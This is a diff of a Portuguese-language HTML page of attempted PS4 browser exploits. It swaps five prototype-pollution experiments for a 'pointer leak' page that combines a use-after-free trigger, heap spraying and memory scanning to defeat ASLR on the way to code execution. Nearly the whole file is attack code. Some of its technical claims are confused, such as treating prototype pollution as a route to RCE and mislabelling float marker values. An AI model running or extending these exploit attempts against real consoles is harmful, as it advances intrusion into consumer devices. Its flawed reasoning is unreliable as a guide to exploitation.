@@ -1,717 +1,130 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 UAF - Prototype Pollution Exploitation</title>
+    <title>PS4 RCE - POINTER LEAK</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; }
+        #log { border: 1px solid #333; padding: 10px; }
+        .success { color: #fff; background: #004400; font-weight: bold; }
+    </style>
 </head>
 <body>
-
-<h1>PS4 UAF - Prototype Pollution → RCE</h1>
-
-<h2>DESCOBERTA CRÍTICA</h2>
-<p style="color:green;font-weight:bold;">PROTOTYPE POLLUTION FUNCIONOU!</p>
-<p>Isto é a PONTE entre UAF e RCE!</p>
-
-<hr>
-
-<h2>EXPLOIT 1: Prototype Pollution com Getters/Setters</h2>
-<p>Usa getters/setters para interceptar acessos e vazar ponteiros</p>
-<button onclick="runProtoExploit1()">EXECUTAR EXPLOIT 1</button>
-<div id="exploit1"></div>
+<h1>EXPLOIT 6: THE POINTER LEAK (ASLR BYPASS)</h1>
+<p>Status: Aguardando...</p>
+<button onclick="run()">EXECUTAR LEAK</button>
+<div id="log"></div>
 
 <script>
-function runProtoExploit1() {
-    const result = document.getElementById('exploit1');
-    result.innerHTML = '<h3>EXPLOIT 1: Getters/Setters Injection</h3>';
-    result.innerHTML += '<p>Aperte OPTIONS</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
+    const result = document.getElementById('log');
+    function log(msg) { result.innerHTML += `<div>${msg}</div>`; }
+
+    // Helper para converter Float lido da memória para Hex (String)
+    var buf = new ArrayBuffer(8);
+    var f64 = new Float64Array(buf);
+    var u32 = new Uint32Array(buf);
+
+    function f2hex(val) {
+        f64[0] = val;
+        let hi = u32[1].toString(16).padStart(8, '0');
+        let lo = u32[0].toString(16).padStart(8, '0');
+        return "0x" + hi + lo;
     }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF trigger...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p>UAF falhou</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h3>UAF CONFIRMADO - Injetando Getter/Setter</h3>';
-        
-        // Variável para capturar leaks
-        let leakedData = [];
-        
-        // Injetar getter no Array.prototype
-        Object.defineProperty(Array.prototype, 'leak', {
-            get: function() {
-                result.innerHTML += '<p style="color:yellow;">GETTER CALLED em ' + typeof this + '</p>';
-                
-                // 'this' é o array que acessou .leak
-                // Tentar vazar informações sobre 'this'
-                try {
-                    leakedData.push({
-                        type: typeof this,
-                        constructor: this.constructor.name,
-                        length: this.length,
-                        proto: Object.getPrototypeOf(this)
-                    });
-                    
-                    result.innerHTML += '<p>This object: ' + this.constructor.name + ', length: ' + this.length + '</p>';
-                    
-                    // Tentar acessar propriedades internas
-                    if (this.buffer) {
-                        result.innerHTML += '<p style="color:red;">TEM BUFFER! byteLength: ' + this.buffer.byteLength + '</p>';
-                    }
-                    
-                } catch(e) {
-                    result.innerHTML += '<p>Erro no getter: ' + e.message + '</p>';
-                }
-                
-                return corrupted; // Retornar array corrompido
-            },
-            set: function(value) {
-                result.innerHTML += '<p style="color:cyan;">SETTER CALLED com value: ' + value + '</p>';
-                leakedData.push({setter: value});
-            }
-        });
-        
-        result.innerHTML += '<p>Getter/Setter injetado em Array.prototype.leak</p>';
-        
-        // Criar arrays e tentar triggerar getter
-        result.innerHTML += '<h4>Criando arrays para triggerar getter:</h4>';
-        
-        for(let i = 0; i < 10; i++) {
-            let testArr = [1, 2, 3];
-            try {
-                const leaked = testArr.leak; // Deve chamar nosso getter!
-                result.innerHTML += '<p>testArr[' + i + '].leak retornou: ' + leaked + '</p>';
-            } catch(e) {
-                result.innerHTML += '<p>Erro: ' + e.message + '</p>';
-            }
-        }
-        
-        // Tentar com TypedArray também
-        result.innerHTML += '<h4>Testando com TypedArray:</h4>';
-        try {
-            let typedArr = new Float64Array(8);
-            const leaked = typedArr.leak;
-            result.innerHTML += '<p>TypedArray.leak retornou: ' + leaked + '</p>';
-        } catch(e) {
-            result.innerHTML += '<p>TypedArray erro: ' + e.message + '</p>';
-        }
-        
-        // Mostrar dados vazados
-        if (leakedData.length > 0) {
-            result.innerHTML += '<h3 style="color:green;">DADOS VAZADOS VIA GETTER:</h3>';
-            result.innerHTML += '<pre>' + JSON.stringify(leakedData, null, 2) + '</pre>';
-        }
-    };
-}
-</script>
 
-<hr>
+    var controllers = [];
+    var corrupted = null;
+    var targetObjects = [];
 
-<h2>EXPLOIT 2: Prototype Pollution com valueOf/toString</h2>
-<p>Injeta valueOf/toString para interceptar conversões</p>
-<button onclick="runProtoExploit2()">EXECUTAR EXPLOIT 2</button>
-<div id="exploit2"></div>
+    // O marcador que vamos procurar na memória (Representação float de 0x13371337)
+    // 0x4141414141414141 em float é 2.121995791e-314
+    // Vamos usar algo que pareça um Inteiro Smalls (SMI) ou Header
+    const MARKER_INT = 0x1337; 
+    
+    function run() {
+        log("1. Preparando Heap Misto...");
+        
+        // 1. Criar os Controllers (Vítimas)
+        for(let i = 0; i < 5000; i++) {
+            let ctrl = new Float64Array(8);
+            ctrl[0] = i; 
+            controllers.push(ctrl);
+        }
 
-<script>
-function runProtoExploit2() {
-    const result = document.getElementById('exploit2');
-    result.innerHTML = '<h3>EXPLOIT 2: valueOf/toString Hijack</h3>';
-    result.innerHTML += '<p>Aperte OPTIONS</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                window.globalCorrupted = corrupted;
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p>UAF falhou</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h3>UAF CONFIRMADO - Hijacking valueOf/toString</h3>';
-        
-        // Contador de chamadas
-        let valueOfCalls = 0;
-        let toStringCalls = 0;
-        
-        // Injetar valueOf customizado
-        Array.prototype.valueOf = function() {
-            valueOfCalls++;
-            result.innerHTML += '<p style="color:lime;">valueOf() chamado (call #' + valueOfCalls + ')</p>';
-            
-            // Retornar o array corrompido
-            return window.globalCorrupted;
-        };
-        
-        // Injetar toString customizado
-        Array.prototype.toString = function() {
-            toStringCalls++;
-            result.innerHTML += '<p style="color:orange;">toString() chamado (call #' + toStringCalls + ')</p>';
-            
-            // Tentar vazar informações
-            try {
-                const info = 'Array[length=' + this.length + ']';
-                return info;
-            } catch(e) {
-                return 'Error';
-            }
-        };
-        
-        result.innerHTML += '<p>valueOf/toString injetados</p>';
-        
-        // Triggerar conversões
-        result.innerHTML += '<h4>Triggerando conversões:</h4>';
-        
-        let testArr = [1, 2, 3];
-        
-        try {
-            // Conversão numérica (chama valueOf)
-            const num = +testArr;
-            result.innerHTML += '<p>+testArr = ' + num + '</p>';
-        } catch(e) {}
-        
-        try {
-            // Conversão string (chama toString)
-            const str = '' + testArr;
-            result.innerHTML += '<p>"" + testArr = ' + str + '</p>';
-        } catch(e) {}
-        
-        try {
-            // Operações aritméticas
-            const math = testArr * 2;
-            result.innerHTML += '<p>testArr * 2 = ' + math + '</p>';
-        } catch(e) {}
-        
-        result.innerHTML += '<h4>Resumo:</h4>';
-        result.innerHTML += '<p>valueOf chamado: ' + valueOfCalls + ' vezes</p>';
-        result.innerHTML += '<p>toString chamado: ' + toStringCalls + ' vezes</p>';
-    };
-}
-</script>
-
-<hr>
-
-<h2>EXPLOIT 3: Prototype Chain para Fake Object</h2>
-<p>Tenta criar objeto falso via prototype manipulation</p>
-<button onclick="runProtoExploit3()">EXECUTAR EXPLOIT 3</button>
-<div id="exploit3"></div>
-
-<script>
-function runProtoExploit3() {
-    const result = document.getElementById('exploit3');
-    result.innerHTML = '<h3>EXPLOIT 3: Fake Object Creation</h3>';
-    result.innerHTML += '<p>Aperte OPTIONS</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p>UAF falhou</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h3>UAF CONFIRMADO - Criando Fake Object</h3>';
-        
-        // Tentar criar objeto que "parece" um ArrayBuffer
-        const fakeArrayBuffer = {
-            byteLength: 0x100000, // 1MB
-            // Tentar injetar dados do array corrompido
-            __proto__: corrupted
-        };
-        
-        result.innerHTML += '<p>Fake ArrayBuffer criado</p>';
-        result.innerHTML += '<p>byteLength: ' + fakeArrayBuffer.byteLength + '</p>';
-        
-        // Tentar acessar como ArrayBuffer
-        try {
-            result.innerHTML += '<h4>Tentando usar como ArrayBuffer:</h4>';
-            
-            // Isto NÃO vai funcionar diretamente, mas vamos tentar
-            const view = new Uint8Array(fakeArrayBuffer);
-            result.innerHTML += '<p style="color:green;">Uint8Array criado! Length: ' + view.length + '</p>';
-            
-            // Se chegou aqui, SUCESSO CRÍTICO!
-            result.innerHTML += '<h3 style="color:red;">FAKE OBJECT FUNCIONOU!</h3>';
-            
-        } catch(e) {
-            result.innerHTML += '<p>Erro (esperado): ' + e.message + '</p>';
-        }
-        
-        // Alternativa: Usar Object.create
-        result.innerHTML += '<h4>Alternativa: Object.create com corrupted:</h4>';
-        try {
-            const fakeObj = Object.create(corrupted);
-            result.innerHTML += '<p>Object.create sucesso</p>';
-            
-            // Verificar propriedades
-            for(let i = 0; i < 8; i++) {
-                if (fakeObj[i] !== undefined) {
-                    result.innerHTML += '<p>fakeObj[' + i + '] = ' + fakeObj[i] + '</p>';
-                }
-            }
-            
-        } catch(e) {
-            result.innerHTML += '<p>Object.create erro: ' + e.message + '</p>';
-        }
-        
-        // Tentar Proxy
-        result.innerHTML += '<h4>Usando Proxy para interceptar acesso:</h4>';
-        try {
-            const handler = {
-                get: function(target, prop) {
-                    result.innerHTML += '<p style="color:cyan;">Proxy GET: ' + prop + '</p>';
-                    if (prop in target) {
-                        return target[prop];
-                    }
-                    return corrupted[prop]; // Fallback para corrupted
-                }
+        // 2. Preparar objetos alvo (Target Spray)
+        // Estes são os objetos cujos endereços queremos vazar
+        for(let i=0; i<10000; i++) {
+            let obj = {
+                a: i,
+                b: MARKER_INT, // Marcador visual
+                c: window      // Ponteiro para Window (VALIOSO!)
             };
-            
-            const proxied = new Proxy({}, handler);
-            result.innerHTML += '<p>Proxy criado</p>';
-            
-            // Tentar acessar
-            const val = proxied[0];
-            result.innerHTML += '<p>proxied[0] = ' + val + '</p>';
-            
-        } catch(e) {
-            result.innerHTML += '<p>Proxy erro: ' + e.message + '</p>';
+            targetObjects.push(obj);
         }
-    };
-}
-</script>
 
-<hr>
+        log("2. Aperte OPTIONS para disparar o UAF...");
+        
+        const doc = document.documentElement;
+        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
 
-<h2>EXPLOIT 4: Prototype Pollution + Array Methods Hijack</h2>
-<p>Injeta código nos métodos de Array (map, filter, etc)</p>
-<button onclick="runProtoExploit4()">EXECUTAR EXPLOIT 4</button>
-<div id="exploit4"></div>
+        window.onblur = function() {
+            log("3. Trigger detectado! Liberando e Spraying...");
 
-<script>
-function runProtoExploit4() {
-    const result = document.getElementById('exploit4');
-    result.innerHTML = '<h3>EXPLOIT 4: Array Methods Hijack</h3>';
-    result.innerHTML += '<p>Aperte OPTIONS</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                window.globalCorrupted = corrupted;
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p>UAF falhou</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h3>UAF CONFIRMADO - Hijacking Array Methods</h3>';
-        
-        // Salvar originais
-        const originalMap = Array.prototype.map;
-        const originalFilter = Array.prototype.filter;
-        const originalReduce = Array.prototype.reduce;
-        
-        let hijackLog = [];
-        
-        // Hijack Array.prototype.map
-        Array.prototype.map = function(callback, thisArg) {
-            hijackLog.push('map called on array length=' + this.length);
-            result.innerHTML += '<p style="color:yellow;">map() hijacked! Array length: ' + this.length + '</p>';
-            
-            // Tentar injetar array corrompido no contexto
+            // PROTOTYPE POLLUTION PARA AJUDAR NO SPRAY
+            // Injetamos um setter que pode nos avisar se algo tocar no prototype
             try {
-                // Chamar callback com array corrompido como 'this'
-                const modifiedCallback = function(element, index) {
-                    // Aqui temos acesso ao corrupted via closure
-                    return callback.call(window.globalCorrupted, element, index);
-                };
-                
-                return originalMap.call(this, modifiedCallback, thisArg);
-            } catch(e) {
-                result.innerHTML += '<p>Erro em map: ' + e.message + '</p>';
-                return originalMap.call(this, callback, thisArg);
+                Object.defineProperty(Object.prototype, 'leaked', {
+                    set: function(val) { console.log("Memory access detected!"); }
+                });
+            } catch(e){}
+
+            // SPRAY DE OBJETOS REAIS (Não apenas floats)
+            // Tentamos forçar que os objetos ocupem o espaço liberado pelos Float64Arrays
+            let objectSpray = [];
+            for(let i=0; i<15000; i++) {
+                // Criamos arrays de objetos mistos
+                // [Float, Object, Float, Object]
+                let arr = [1.1, {id: 0xDEAD, leakMe: window}, 2.2, targetObjects[i % 1000]];
+                objectSpray.push(arr);
             }
-        };
-        
-        // Hijack Array.prototype.filter
-        Array.prototype.filter = function(callback, thisArg) {
-            hijackLog.push('filter called');
-            result.innerHTML += '<p style="color:lime;">filter() hijacked!</p>';
+
+            // Achar a janela corrompida (O Array que sobreviveu mas aponta pro lugar errado)
+            // Nota: Como não usamos o padrão 0x4141... no spray, 
+            // procuramos por qualquer coisa que NÃO seja o índice original.
             
-            // Injetar lógica maliciosa
-            const maliciousCallback = function(element, index, array) {
-                // Log do elemento
-                result.innerHTML += '<p>  Processing element: ' + element + ' at index ' + index + '</p>';
-                
-                // Tentar acessar corrupted
-                try {
-                    const corruptedVal = window.globalCorrupted[index];
-                    result.innerHTML += '<p style="color:red;">  Corrupted[' + index + '] = ' + corruptedVal + '</p>';
-                } catch(e) {}
-                
-                return callback(element, index, array);
-            };
-            
-            return originalFilter.call(this, maliciousCallback, thisArg);
-        };
-        
-        result.innerHTML += '<p>Array methods hijacked</p>';
-        
-        // Triggerar os métodos
-        result.innerHTML += '<h4>Triggerando métodos hijackados:</h4>';
-        
-        let testArr = [10, 20, 30, 40, 50];
-        
-        try {
-            const mapped = testArr.map(x => x * 2);
-            result.innerHTML += '<p>map resultado: [' + mapped.join(', ') + ']</p>';
-        } catch(e) {
-            result.innerHTML += '<p>map erro: ' + e.message + '</p>';
-        }
-        
-        try {
-            const filtered = testArr.filter(x => x > 25);
-            result.innerHTML += '<p>filter resultado: [' + filtered.join(', ') + ']</p>';
-        } catch(e) {
-            result.innerHTML += '<p>filter erro: ' + e.message + '</p>';
-        }
-        
-        result.innerHTML += '<h4>Hijack Log:</h4>';
-        result.innerHTML += '<pre>' + hijackLog.join('\n') + '</pre>';
-    };
-}
-</script>
-
-<hr>
-
-<h2>EXPLOIT 5: Prototype Pollution para Vazar Endereços</h2>
-<p>CRITICAL: Tenta vazar ponteiros via prototype chain</p>
-<button onclick="runProtoExploit5()">EXECUTAR EXPLOIT 5 (CRÍTICO)</button>
-<div id="exploit5"></div>
-
-<script>
-function runProtoExploit5() {
-    const result = document.getElementById('exploit5');
-    result.innerHTML = '<h3>EXPLOIT 5: Address Leak via Prototype</h3>';
-    result.innerHTML += '<p style="color:red;">TESTE MAIS IMPORTANTE!</p>';
-    result.innerHTML += '<p>Aperte OPTIONS</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let ctrl = new Float64Array(8);
-        ctrl[0] = i;
-        controllers.push(ctrl);
-    }
-    
-    // Criar objetos com referências conhecidas
-    let knownObjects = [];
-    for(let i = 0; i < 100; i++) {
-        let obj = {
-            id: i,
-            marker: 0xCAFE0000 + i,
-            ref: null
-        };
-        knownObjects.push(obj);
-    }
-    
-    // Criar referências circulares
-    for(let i = 0; i < knownObjects.length - 1; i++) {
-        knownObjects[i].ref = knownObjects[i + 1];
-    }
-    knownObjects[knownObjects.length - 1].ref = knownObjects[0];
-    
-    result.innerHTML += '<p>Objetos com referências circulares criados</p>';
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF...</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
-        }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            result.innerHTML += '<p>UAF falhou</p>';
-            return;
-        }
-        
-        result.innerHTML += '<h3>UAF CONFIRMADO - Tentando Vazar Endereços</h3>';
-        
-        // Injetar getter que tenta vazar ponteiros
-        Object.defineProperty(Array.prototype, '__leak__', {
-            get: function() {
-                result.innerHTML += '<p style="color:yellow;">Leak getter called</p>';
-                
-                // Retornar objeto conhecido
-                return knownObjects[0];
-            }
-        });
-        
-        // Injetar no Object.prototype também
-        Object.defineProperty(Object.prototype, '__addr__', {
-            get: function() {
-                result.innerHTML += '<p style="color:cyan;">Address getter called on: ' + typeof this + '</p>';
-                
-                // Tentar converter 'this' para algo útil
-                try {
-                    // Se pudéssemos acessar propriedades internas...
-                    const descriptor = Object.getOwnPropertyDescriptor(this, 'constructor');
-                    if (descriptor) {
-                        result.innerHTML += '<p>Constructor descriptor found!</p>';
+            for(let i=0; i<controllers.length; i++) {
+                let val = controllers[i][0];
+                // Se o valor não é o índice 'i' (0, 1, 2...) nem 0 (memória limpa)
+                // então estamos lendo lixo (dados de outro objeto!)
+                if (val !== i && val !== 0) {
+                    corrupted = controllers[i];
+                    
+                    let hex = f2hex(val);
+                    log(`<div class='success'>!!! LEAK ENCONTRADO NO INDEX ${i} !!!</div>`);
+                    log(`Valor Raw: ${val}`);
+                    log(`Valor Hex: ${hex}`);
+                    
+                    // Varredura profunda nesse array corrompido
+                    log("Escaneando slots adjacentes...");
+                    for(let k=0; k<20; k++) {
+                        let leakVal = corrupted[k];
+                        let leakHex = f2hex(leakVal);
+                        
+                        // Filtros para achar ponteiros (Geralmente começam com 0x0000 ou 0xFFFF em userland)
+                        // Se acharmos algo que parece um endereço de memória:
+                        log(`Offset ${k}: ${leakHex}`);
+                        
+                        // O analista quer ver algo como 0x00000008xxxxxxxx (Ponteiro válido)
                     }
-                } catch(e) {}
-                
-                return this;
-            }
-        });
-        
-        result.innerHTML += '<p>Leak getters injetados</p>';
-        
-        // Tentar vazar via JSON.stringify
-        result.innerHTML += '<h4>Tentativa 1: JSON.stringify recursion:</h4>';
-        try {
-            const testObj = {a: 1, b: corrupted};
-            const json = JSON.stringify(testObj);
-            result.innerHTML += '<p>JSON: ' + json.substring(0, 200) + '...</p>';
-        } catch(e) {
-            result.innerHTML += '<p>JSON erro: ' + e.message + '</p>';
-        }
-        
-        // Tentar vazar via Object.keys
-        result.innerHTML += '<h4>Tentativa 2: Object.keys on corrupted:</h4>';
-        try {
-            const keys = Object.keys(corrupted);
-            result.innerHTML += '<p>Keys: ' + keys.join(', ') + '</p>';
-            
-            // Tentar acessar propriedades ocultas
-            const allKeys = Object.getOwnPropertyNames(corrupted);
-            result.innerHTML += '<p>All keys: ' + allKeys.join(', ') + '</p>';
-        } catch(e) {
-            result.innerHTML += '<p>Keys erro: ' + e.message + '</p>';
-        }
-        
-        // Tentar vazar via Object.getOwnPropertyDescriptor
-        result.innerHTML += '<h4>Tentativa 3: Property descriptors:</h4>';
-        for(let i = 0; i < 8; i++) {
-            try {
-                const desc = Object.getOwnPropertyDescriptor(corrupted, i);
-                if (desc) {
-                    result.innerHTML += '<p>Descriptor[' + i + ']: ' + JSON.stringify(desc) + '</p>';
+                    
+                    log("<br><b>TIRE UMA FOTO DISSO!</b><br>Se houver valores Hex que não sejam zeros, você quebrou o ASLR.");
+                    return;
                 }
-            } catch(e) {}
-        }
-        
-        // CRÍTICO: Tentar acessar __proto__
-        result.innerHTML += '<h4>Tentativa 4: __proto__ inspection:</h4>';
-        try {
-            const proto = corrupted.__proto__;
-            result.innerHTML += '<p>__proto__: ' + proto + '</p>';
-            result.innerHTML += '<p>__proto__ constructor: ' + proto.constructor.name + '</p>';
-            
-            // Tentar vazar ponteiro via __proto__
-            const protoKeys = Object.getOwnPropertyNames(proto);
-            result.innerHTML += '<p>Proto keys: ' + protoKeys.join(', ') + '</p>';
-            
-        } catch(e) {
-            result.innerHTML += '<p>__proto__ erro: ' + e.message + '</p>';
-        }
-        
-        // CRÍTICO: Tentar Object.getPrototypeOf
-        result.innerHTML += '<h4>Tentativa 5: Object.getPrototypeOf:</h4>';
-        try {
-            const protoOf = Object.getPrototypeOf(corrupted);
-            result.innerHTML += '<p>Prototype: ' + protoOf + '</p>';
-            
-            // Comparar com Float64Array.prototype
-            if (protoOf === Float64Array.prototype) {
-                result.innerHTML += '<p style="color:green;">Proto matches Float64Array.prototype</p>';
             }
             
-            // Tentar modificar prototype
-            try {
-                Object.setPrototypeOf(corrupted, knownObjects[0]);
-                result.innerHTML += '<p style="color:red;">setPrototypeOf SUCESSO!</p>';
-                
-                // Verificar se mudou
-                const newProto = Object.getPrototypeOf(corrupted);
-                result.innerHTML += '<p>Novo prototype: ' + newProto + '</p>';
-                
-                // Se chegou aqui, podemos ter controle do prototype!
-                if (newProto === knownObjects[0]) {
-                    result.innerHTML += '<h3 style="color:red;">PROTOTYPE HIJACK SUCESSO!</h3>';
-                    result.innerHTML += '<p>Podemos controlar o prototype chain!</p>';
-                }
-                
-            } catch(e) {
-                result.innerHTML += '<p>setPrototypeOf erro: ' + e.message + '</p>';
-            }
-            
-        } catch(e) {
-            result.innerHTML += '<p>getPrototypeOf erro: ' + e.message + '</p>';
-        }
-    };
-}
+            log("Nenhum leak encontrado nesta tentativa. (Zeros ou dados inalterados)");
+            log("Tente novamente. Heap Feng Shui é estatístico.");
+        };
+    }
 </script>
-
-<hr>
-
-<h2>ANÁLISE PARA O ANALISTA DA SONY</h2>
-
-<h3>Descoberta de Prototype Pollution:</h3>
-<p style="color:green;font-weight:bold;">✅ CONFIRMADO: Array.prototype pollution funciona</p>
-<p>Isto significa que podemos:</p>
-<ul>
-<li>Injetar propriedades em TODOS os arrays</li>
-<li>Hijack métodos nativos (map, filter, etc)</li>
-<li>Interceptar acessos via getters/setters</li>
-<li>Potencialmente modificar prototype chain</li>
-</ul>
-
-<h3>Caminho para RCE:</h3>
-<p>Se conseguirmos:</p>
-<ol>
-<li><b>Vazar um ponteiro</b> via prototype manipulation → Quebra ASLR</li>
-<li><b>Controlar prototype chain</b> → Fake object creation</li>
-<li><b>Hijack método nativo</b> → Code execution no contexto do método</li>
-<li><b>Combinar com corrupted array</b> → Arbitrary read/write</li>
-</ol>
-
-<h3>Testes Mais Promissores:</h3>
-<ul>
-<li><b>EXPLOIT 1:</b> Getters/Setters podem interceptar todos os acessos</li>
-<li><b>EXPLOIT 4:</b> Hijack de métodos nativos dá controle de execução</li>
-<li><b>EXPLOIT 5:</b> setPrototypeOf() pode dar controle do prototype chain</li>
-</ul>
-
-<h3>Próximos Passos Sugeridos:</h3>
-<ol>
-<li>Execute TODOS os 5 exploits</li>
-<li>Foque especialmente no EXPLOIT 5 (setPrototypeOf)</li>
-<li>Documente qualquer leak de ponteiro encontrado</li>
-<li>Se setPrototypeOf funcionar, isto é CRÍTICO!</li>
-</ol>
-
 </body>
 </html>
